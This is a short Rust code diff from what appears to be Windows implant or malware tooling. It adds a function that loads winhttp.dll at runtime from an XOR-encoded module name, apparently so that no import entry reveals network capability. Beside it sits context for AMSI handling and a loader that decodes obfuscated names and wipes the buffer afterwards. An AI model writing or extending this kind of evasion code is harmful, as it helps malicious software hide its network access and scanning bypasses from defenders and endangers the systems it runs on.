@@ -56,6 +56,20 @@ pub fn ensure_amsi() -> Result<(), &'static str> {
     Ok(())
 }
 
+// Load winhttp.dll (encoded name) on first fetch and populate the export
+// cache with its WinHttp* entry points. Idempotent — safe to call repeatedly.
+// Keeps winhttp as a RUNTIME dependency only; no PE import entry is added.
+pub static WINHTTP_BASE: AtomicUsize = AtomicUsize::new(0);
+
+pub fn ensure_winhttp() -> Result<(), &'static str> {
+    if WINHTTP_BASE.load(Ordering::SeqCst) != 0 { return Ok(()); }
+    let base = load_by_encoded_name(&encoded_strings::ENC_WINHTTP_DLL_W,
+                                    &encoded_strings::KEY_WINHTTP_DLL_W)?;
+    WINHTTP_BASE.store(base, Ordering::SeqCst);
+    unsafe { build_export_cache(base as *const u8); }
+    Ok(())
+}
+
 // Decode a XOR'd wide module name onto a transient buffer, try GetModuleHandleW,
 // fall back to LoadLibraryW, wipe the buffer. Returns module base or Err.
 fn load_by_encoded_name(enc: &[u8], key: &[u8]) -> Result<usize, &'static str> {
